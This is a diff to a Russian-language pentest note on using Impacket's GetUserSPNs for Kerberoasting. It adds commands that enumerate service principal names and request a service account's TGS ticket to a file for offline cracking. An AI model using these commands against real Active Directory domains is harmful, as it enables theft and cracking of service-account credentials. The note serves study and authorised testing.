@@ -2,11 +2,22 @@
 
 Инструмент для проведения атаки [[Kerberoasting]]
 
-Он ищет Service Accounts c SPN, запрашивает для них TGS и сохраняет их для дальнейшего крака 
+Он ищет Service Accounts c SPN, запрашивает для них TGS и сохраняет их для дальнейшего кряка 
 
 Для проведения атаки необходимо **любой один** пользователь
 
 ### Эксплуатация 
+
+- Вывод всех SPN
+```bash
+Impacket-GetUserSPNs -dc-ip <ip> <domain>/
+```
+
+- Запрос билета конкретного сервисного аккаунта
+```bash
+Impacket-GetUserSPNs -dc-ip <ip> <domain>/<user> -request-user <service_acc>  
+-outputfile <file.tgs>
+```
 
 - Kerberoasting
 ```bash
